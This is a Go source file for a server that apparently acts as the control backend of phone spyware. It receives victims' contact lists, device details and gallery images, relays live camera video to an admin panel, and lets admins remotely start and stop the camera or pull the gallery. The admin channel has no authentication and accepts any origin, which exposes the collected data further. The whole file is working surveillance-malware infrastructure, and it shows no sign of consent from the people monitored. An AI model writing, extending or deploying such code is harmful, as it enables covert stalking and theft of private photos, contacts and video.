package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type Client struct {
	ID          string                 `json:"id"`
	Conn        *websocket.Conn        `json:"-"`
	IP          string                 `json:"ip"`
	Location    string                 `json:"location"`
	UserAgent   string                 `json:"userAgent"`
	ConnectedAt time.Time              `json:"connectedAt"`
	LastSeen    time.Time              `json:"lastSeen"`
	Contacts    []Contact              `json:"contacts"`
	Images      []string               `json:"images"`
	IsStreaming bool                   `json:"isStreaming"`
	DeviceInfo  map[string]interface{} `json:"deviceInfo"`
}

type Contact struct {
	Name        string `json:"name"`
	PhoneNumber string `json:"phoneNumber"`
	Email       string `json:"email"`
}

type UploadRequest struct {
	Name string `json:"name"`
	Data string `json:"data"`
}

type ContactsRequest struct {
	Contacts []Contact `json:"contacts"`
}

type DeviceInfoRequest struct {
	DeviceInfo map[string]interface{} `json:"deviceInfo"`
}

type AdminMessage struct {
	Type     string      `json:"type"`
	ClientID string      `json:"clientId,omitempty"`
	Data     interface{} `json:"data,omitempty"`
}

var (
	clients      = make(map[string]*Client)
	adminClients = make(map[*websocket.Conn]bool)
	clientsMutex sync.RWMutex
	upgrader     = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true
		},
	}
)

func getClientIP(r *http.Request) string {
	// Check X-Forwarded-For header
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		return strings.Split(forwarded, ",")[0]
	}

	// Check X-Real-IP header
	realIP := r.Header.Get("X-Real-IP")
	if realIP != "" {
		return realIP
	}

	// Get IP from RemoteAddr
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return ip
}

func getLocationFromIP(ip string) string {
	// Simple IP-based location detection (you can integrate with GeoIP services)
	if strings.HasPrefix(ip, "192.168.") || strings.HasPrefix(ip, "10.") || strings.HasPrefix(ip, "127.") {
		return "Local Network"
	}
	return "Unknown Location" // In production, use GeoIP API
}

func generateClientID() string {
	return fmt.Sprintf("client_%d", time.Now().UnixNano())
}

func broadcastToAdmins(message interface{}) {
	data, _ := json.Marshal(message)
	for adminConn := range adminClients {
		adminConn.WriteMessage(websocket.TextMessage, data)
	}
}

func handleClientWebSocket(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		fmt.Println("WebSocket upgrade failed:", err)
		return
	}
	defer ws.Close()

	clientID := generateClientID()
	clientIP := getClientIP(r)
	location := getLocationFromIP(clientIP)

	client := &Client{
		ID:          clientID,
		Conn:        ws,
		IP:          clientIP,
		Location:    location,
		UserAgent:   r.Header.Get("User-Agent"),
		ConnectedAt: time.Now(),
		LastSeen:    time.Now(),
		Contacts:    []Contact{},
		Images:      []string{},
		IsStreaming: false,
		DeviceInfo:  make(map[string]interface{}),
	}

	clientsMutex.Lock()
	clients[clientID] = client
	clientsMutex.Unlock()

	fmt.Printf("Client connected: %s from %s\n", clientID, clientIP)

	// Notify admins about new client
	broadcastToAdmins(AdminMessage{
		Type: "CLIENT_CONNECTED",
		Data: client,
	})

	// Send initial sync message
	syncMsg := map[string]string{"type": "SYNC_GALLERY"}
	data, _ := json.Marshal(syncMsg)
	ws.WriteMessage(websocket.TextMessage, data)

	for {
		messageType, message, err := ws.ReadMessage()
		if err != nil {
			fmt.Printf("Client %s disconnected: %v\n", clientID, err)
			break
		}

		clientsMutex.Lock()
		client.LastSeen = time.Now()
		clientsMutex.Unlock()

		if messageType == websocket.BinaryMessage {
			// Handle video stream data
			broadcastToAdmins(AdminMessage{
				Type:     "VIDEO_STREAM",
				ClientID: clientID,
				Data:     base64.StdEncoding.EncodeToString(message),
			})
		} else {
			// Handle text messages
			var msg map[string]interface{}
			if err := json.Unmarshal(message, &msg); err == nil {
				handleClientMessage(clientID, msg)
			}
		}
	}

	// Cleanup
	clientsMutex.Lock()
	delete(clients, clientID)
	clientsMutex.Unlock()

	broadcastToAdmins(AdminMessage{
		Type:     "CLIENT_DISCONNECTED",
		ClientID: clientID,
	})
}

func handleClientMessage(clientID string, message map[string]interface{}) {
	msgType, ok := message["type"].(string)
	if !ok {
		return
	}

	clientsMutex.Lock()
	client, exists := clients[clientID]
	if !exists {
		clientsMutex.Unlock()
		return
	}
	clientsMutex.Unlock()

	switch msgType {
	case "CONTACTS":
		if contactsData, ok := message["contacts"].([]interface{}); ok {
			contacts := make([]Contact, 0, len(contactsData))
			for _, contactInterface := range contactsData {
				if contactMap, ok := contactInterface.(map[string]interface{}); ok {
					contact := Contact{
						Name:        getString(contactMap, "name"),
						PhoneNumber: getString(contactMap, "phoneNumber"),
						Email:       getString(contactMap, "email"),
					}
					contacts = append(contacts, contact)
				}
			}

			clientsMutex.Lock()
			client.Contacts = contacts
			clientsMutex.Unlock()

			broadcastToAdmins(AdminMessage{
				Type:     "CONTACTS_UPDATED",
				ClientID: clientID,
				Data:     contacts,
			})
		}

	case "DEVICE_INFO":
		if deviceInfo, ok := message["deviceInfo"].(map[string]interface{}); ok {
			clientsMutex.Lock()
			client.DeviceInfo = deviceInfo
			clientsMutex.Unlock()

			broadcastToAdmins(AdminMessage{
				Type:     "DEVICE_INFO_UPDATED",
				ClientID: clientID,
				Data:     deviceInfo,
			})
		}
	}
}

func getString(m map[string]interface{}, key string) string {
	if val, ok := m[key].(string); ok {
		return val
	}
	return ""
}

func handleAdminWebSocket(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		fmt.Println("Admin WebSocket upgrade failed:", err)
		return
	}
	defer ws.Close()

	adminClients[ws] = true
	fmt.Println("Admin connected")

	// Send current clients list
	clientsMutex.RLock()
	clientsList := make([]*Client, 0, len(clients))
	for _, client := range clients {
		clientsList = append(clientsList, client)
	}
	clientsMutex.RUnlock()

	initialData := AdminMessage{
		Type: "CLIENTS_LIST",
		Data: clientsList,
	}
	data, _ := json.Marshal(initialData)
	ws.WriteMessage(websocket.TextMessage, data)

	for {
		messageType, message, err := ws.ReadMessage()
		if err != nil {
			fmt.Println("Admin disconnected:", err)
			break
		}

		if messageType == websocket.TextMessage {
			var adminMsg AdminMessage
			if err := json.Unmarshal(message, &adminMsg); err == nil {
				handleAdminMessage(adminMsg)
			}
		}
	}

	delete(adminClients, ws)
}

func handleAdminMessage(message AdminMessage) {
	clientsMutex.RLock()
	client, exists := clients[message.ClientID]
	clientsMutex.RUnlock()

	if !exists {
		return
	}

	switch message.Type {
	case "START_CAMERA":
		client.IsStreaming = true
		cmd := map[string]string{"type": "START_CAMERA"}
		data, _ := json.Marshal(cmd)
		client.Conn.WriteMessage(websocket.TextMessage, data)

	case "STOP_CAMERA":
		client.IsStreaming = false
		cmd := map[string]string{"type": "STOP_CAMERA"}
		data, _ := json.Marshal(cmd)
		client.Conn.WriteMessage(websocket.TextMessage, data)

	case "SYNC_GALLERY":
		cmd := map[string]string{"type": "SYNC_GALLERY"}
		data, _ := json.Marshal(cmd)
		client.Conn.WriteMessage(websocket.TextMessage, data)
	}
}

func enableCORS(w http.ResponseWriter) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, GET, OPTIONS, PUT, DELETE")
	w.Header().Set("Access-Control-Allow-Headers", "Accept, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization")
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	enableCORS(w)

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var upload UploadRequest
	err := json.NewDecoder(r.Body).Decode(&upload)
	if err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	data, err := base64.StdEncoding.DecodeString(upload.Data)
	if err != nil {
		http.Error(w, "Failed to decode base64", http.StatusBadRequest)
		return
	}

	if err := os.MkdirAll("uploads", 0755); err != nil {
		http.Error(w, "Failed to create uploads directory", http.StatusInternalServerError)
		return
	}

	cleanName := filepath.Base(upload.Name)
	path := filepath.Join("uploads", cleanName)

	err = os.WriteFile(path, data, 0644)
	if err != nil {
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}

	// Add image to client's image list
	clientIP := getClientIP(r)
	clientsMutex.Lock()
	for _, client := range clients {
		if client.IP == clientIP {
			client.Images = append(client.Images, cleanName)
			break
		}
	}
	clientsMutex.Unlock()

	// Notify admins
	broadcastToAdmins(AdminMessage{
		Type: "IMAGE_UPLOADED",
		Data: map[string]string{
			"filename": cleanName,
			"clientIP": clientIP,
		},
	})

	fmt.Printf("Uploaded: %s from %s\n", path, clientIP)
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Upload successful"))
}

func handleContacts(w http.ResponseWriter, r *http.Request) {
	enableCORS(w)

	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var contactsReq ContactsRequest
	err := json.NewDecoder(r.Body).Decode(&contactsReq)
	if err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	clientIP := getClientIP(r)

	clientsMutex.Lock()
	for _, client := range clients {
		if client.IP == clientIP {
			client.Contacts = contactsReq.Contacts
			break
		}
	}
	clientsMutex.Unlock()

	broadcastToAdmins(AdminMessage{
		Type: "CONTACTS_RECEIVED",
		Data: map[string]interface{}{
			"clientIP": clientIP,
			"contacts": contactsReq.Contacts,
		},
	})

	fmt.Printf("Received %d contacts from %s\n", len(contactsReq.Contacts), clientIP)
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Contacts received"))
}

func serveStaticFiles(w http.ResponseWriter, r *http.Request) {
	// Get the file path
	filePath := strings.TrimPrefix(r.URL.Path, "/")

	// If root path, serve index.html
	if filePath == "" {
		filePath = "admin.html"
	}

	// Check if file exists
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		http.NotFound(w, r)
		return
	}

	// Set proper MIME type based on file extension
	ext := filepath.Ext(filePath)
	switch ext {
	case ".html":
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
	case ".css":
		w.Header().Set("Content-Type", "text/css; charset=utf-8")
	case ".js":
		w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
	case ".json":
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
	case ".png":
		w.Header().Set("Content-Type", "image/png")
	case ".jpg", ".jpeg":
		w.Header().Set("Content-Type", "image/jpeg")
	case ".gif":
		w.Header().Set("Content-Type", "image/gif")
	case ".ico":
		w.Header().Set("Content-Type", "image/x-icon")
	default:
		w.Header().Set("Content-Type", "application/octet-stream")
	}

	// Serve the file
	http.ServeFile(w, r, filePath)
}

func main() {
	// Create uploads folder
	if err := os.MkdirAll("uploads", 0755); err != nil {
		log.Fatal("Failed to create uploads directory:", err)
	}

	// Routes
	http.HandleFunc("/", serveStaticFiles)
	http.HandleFunc("/ws", handleClientWebSocket)
	http.HandleFunc("/admin-ws", handleAdminWebSocket)
	http.HandleFunc("/upload", handleUpload)
	http.HandleFunc("/contacts", handleContacts)

	port := os.Getenv("PORT")
	if port == "" {
		port = "6969" // fallback for local dev
	}
	fmt.Println("Server running at http://localhost:" + port)
	err := http.ListenAndServe(":"+port, nil)

	if err != nil {
		log.Fatal("Server error:", err)
	}
}
